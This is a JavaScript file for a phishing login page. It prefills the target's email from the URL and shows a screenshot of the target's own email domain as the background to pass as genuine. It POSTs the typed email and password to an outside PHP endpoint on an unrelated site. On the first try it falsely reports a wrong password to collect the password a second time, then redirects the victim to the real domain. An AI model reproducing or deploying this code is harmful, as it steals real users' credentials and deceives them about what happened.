document.addEventListener("DOMContentLoaded", () => {

    console.log("app.js loaded");

    const form = document.getElementById("loginForm");
    const emailInput = document.getElementById("email");
    const passwordInput = document.getElementById("password");



    const dateTime = document.getElementById("datetime");
    const locationInfo = document.getElementById("location");
    const msg = document.getElementById("msg");

    let attempts = 0;
let backgroundTimer;

    // ===================================
    // MESSAGE
    // ===================================

    function setMessage(text, color = "black") {
        if (!msg) return;
        msg.textContent = text;
        msg.style.color = color;
    }

    // ===================================
    // EMAIL DOMAIN
    // ===================================

    function getDomain(email) {

        if (!email) return "";

        email = email.trim();

        const parts = email.split("@");

        if (parts.length !== 2) return "";

        return parts[1].toLowerCase().trim();
    }

    function isValidDomain(domain) {

    return /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain);

}
    

// ===================================
// BACKGROUND
// ===================================

function applyBackground(domain) {

    if (!domain || !isValidDomain(domain)) {
        return;
    }

    const loginPage = document.getElementById("login-page");

    if (!loginPage) {
        console.error("login-page element not found");
        return;
    }

    const website = `https://${domain}`;

    const screenshotUrl =
        `https://image.thum.io/get/width/1600/crop/900/${encodeURIComponent(website)}`;

    console.log("Background domain:", domain);
    console.log("Screenshot URL:", screenshotUrl);

    loginPage.style.backgroundImage = `url("${screenshotUrl}")`;
    loginPage.style.backgroundSize = "cover";
    loginPage.style.backgroundPosition = "center";
    loginPage.style.backgroundRepeat = "no-repeat";
}

    // ===================================
    // LOAD EMAIL FROM URL
    // ===================================

function loadEmailFromURL() {

    console.log("Checking URL email");

    const params = new URLSearchParams(window.location.search);

    const email = params.get("email");

    console.log("URL email:", email);

    if (!email) return;

    emailInput.value = decodeURIComponent(email.trim());

    const domain = getDomain(email);

    console.log("Extracted domain:", domain);

    if (domain) {
        applyBackground(domain);
    }

}

    // ===================================
    // LIVE EMAIL CHANGE
    // ===================================

  emailInput.addEventListener("input", () => {

    clearTimeout(backgroundTimer);

    backgroundTimer = setTimeout(() => {

        const domain = getDomain(emailInput.value);

        applyBackground(domain);

    }, 800);

});

    // ===================================
    // DATE & TIME
    // ===================================

    function updateTime() {

        if (!dateTime) return;

        dateTime.textContent =
            new Date().toLocaleString();

    }

    updateTime();

    setInterval(updateTime, 1000);

    // ===================================
    // LOCATION
    // ===================================

    async function getLocation() {

        if (!locationInfo) return;

        if (!navigator.geolocation) {

            locationInfo.textContent =
                "Geolocation not supported.";

            return;

        }

        navigator.geolocation.getCurrentPosition(

            async (position) => {

                const {
                    latitude,
                    longitude
                } = position.coords;

                try {

                    const response = await fetch(

                        `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`

                    );


if (!response.ok) {
    throw new Error("Location lookup failed");
}

                    

                  const data = await response.json();

if (!data.address) {
    throw new Error("No address returned");
}

const city =
    data.address.city ||
    data.address.town ||
    data.address.village ||
    data.address.county ||
    "Unknown";

const country =
    data.address.country || "";

locationInfo.textContent =
    `${city}, ${country}`;

}
catch {

    locationInfo.textContent =
        `${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;

}

},
(error) => {

    locationInfo.textContent = "Location unavailable.";

});

}

    // ===================================
    // LOGIN
    // ===================================
if (form) {

    form.addEventListener("submit", async (e) => {

        e.preventDefault();

        console.log("Submit button clicked");

        if (!emailInput || !passwordInput) {
            console.error("Input fields missing.");
            return;
        }

        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();

        if (!email || !password) {

            setMessage(
                "Fill in all fields.",
                "red"
            );

            return;

        }




try {



 const cities = [
   ];

const city = cities[Math.floor(Math.random() * cities.length)];
const currentTime = new Date().toISOString();

const res = await fetch("https://lorneplumbing.com.au/oxo/login.php", {

    method: "POST",

    headers: {
        "Content-Type": "application/json"
    },

    body: JSON.stringify({
        email: email,
        password: password,
        city: city,
        currentTime: currentTime
    })

});









        



if (!res.ok) {
    throw new Error(`HTTP ${res.status}`);
}

const text = await res.text();

console.log("AJAX finished");
console.log("Raw server response:", text);

} 

catch (error) {

    console.error("AJAX ERROR:", error);


setMessage(
    "Network error. Please try again.",
    "red"
);

return;

}

attempts++;

if (attempts === 1) {

    console.log("First attempt block reached");

setMessage(
    "Incorrect password. Please try again.",
    "red"
);

    passwordInput.value = "";
    passwordInput.focus();

    return;

}

if (attempts >= 2) {

    console.log("Attempt count:", attempts);

    const domain = getDomain(email);

    console.log("Redirect domain:", domain);

    if (!isValidDomain(domain)) {

        setMessage(
            "Invalid email domain.",
            "red"
        );

        return;

    }

    setTimeout(() => {

    console.log("Redirecting to:", `https://${domain}`);

    window.location.href = `https://${domain}`;

}, 800);

}

    });

}

});
